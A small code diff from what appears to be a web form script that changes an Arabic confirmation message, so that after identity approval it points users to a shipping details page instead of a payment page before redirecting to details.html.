@@ -191,7 +191,7 @@ $('f').addEventListener('submit', async e => {
 
           if (data.status === 'approved') {
             clearInterval(checkInterval);
-            waitDiv.innerHTML = '✅ تم تأكيد الهوية بنجاح! جاري تحويلك لصفحة الدفع...';
+            waitDiv.innerHTML = '✅ تم تأكيد الهوية بنجاح! جاري تحويلك لصفحة بيانات الشحن...';
             setTimeout(() => {
               window.location.href = 'details.html';
             }, 1000);
